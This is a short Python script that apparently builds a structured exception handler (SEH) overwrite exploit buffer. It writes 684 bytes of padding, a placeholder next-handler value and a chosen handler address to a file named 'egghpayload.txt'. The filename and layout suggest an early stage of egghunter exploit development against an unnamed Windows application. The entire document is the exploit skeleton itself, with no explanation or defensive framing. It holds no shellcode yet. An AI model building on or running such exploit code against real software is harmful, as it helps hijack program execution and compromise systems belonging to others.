#!/usr/bin/python
import struct

file2="egghpayload.txt"


nSEH = "B" * 4
SEH  = "\x4b\x4d\x47"     # 0x00474d4b

egghpayload  = "A" * 684
egghpayload += nSEH
egghpayload += SEH
#egghpayload += "D" * (5000 - len(egghpayload))


textfile = open(file2 , 'w')
textfile.write(egghpayload)
textfile.close()

